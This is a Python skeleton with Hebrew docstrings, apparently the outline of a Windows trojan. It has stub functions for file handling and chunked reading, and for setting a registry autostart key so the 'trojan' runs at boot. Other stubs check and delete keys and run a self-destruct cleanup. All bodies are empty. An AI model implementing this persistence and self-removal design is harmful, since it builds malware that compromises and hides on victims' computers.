import os, winreg
from random import randint
from Api.protocol import  NOOD_NAME,  startup_keys


TypeFileBinary = []   # // real value not here
MAX_SIZE_EDITOR = 0  # // real value not here


class ManaFileFolder:
	
    def __init__(self, path: str, save_as: str = None):
		pass

    def CreatePath(self) -> str:
		"""
  		מייצר נתיב שלא קיים
  		"""
		pass

    def isHidden(self, path=None) -> bool:
		"""
  		האם הנתיב הוא מוסתר כחלק ממאפייני הקובץ
  		"""
		pass

    def SaveAs(self):
		"""
  		מגדיר את הנתיב הסופי והמלא
  		"""
		pass

    def GetBase(self):
		"""
  		מחזיר שם קובץ
  		"""
		pass

def yield_file(file: 'open_file', path) -> bytes | str:
	"""
 	יצירת אובייקט לקריאה מתוזמנת בקצב 4 אלף בתים בכל סיבוב
 	"""
	pass

def open_file(path, Mode="rb"):
	"""
 	מחזיר מצביע של קובץ אם לא נכשל
 	"""
	pass

def yield_4096_byte_array(_byte):
	"""
 	קריאה מתוזמנת בקצב 4 אלף בתים מתוך משתנה מסוג רשימה
 	"""
	pass

def set_trojan_start_on_up(path_trojan:str) -> bool:
	"""
 	פעולה מסוכנת ומרעישה
	מגדיר מפתח להרצה אוטומטית בעת העלאת המחשב
 	"""
	pass

def verify_key_is_exist(with_this_path:str, key_win_object:winreg.OpenKey=None, name_key=None) -> tuple[bool, bool]:
	"""
 	מוודא האם המפתח כבר נוצר במערכת
 	"""
	pass

def delete_key(name:str) -> int:
	"""
 	מוחק מפתח על פי השם שלו
 	"""
	pass

def CLEANUP():
	"""
 	התאבדות הסוס, השמדה וניקוי
 	"""
	pass

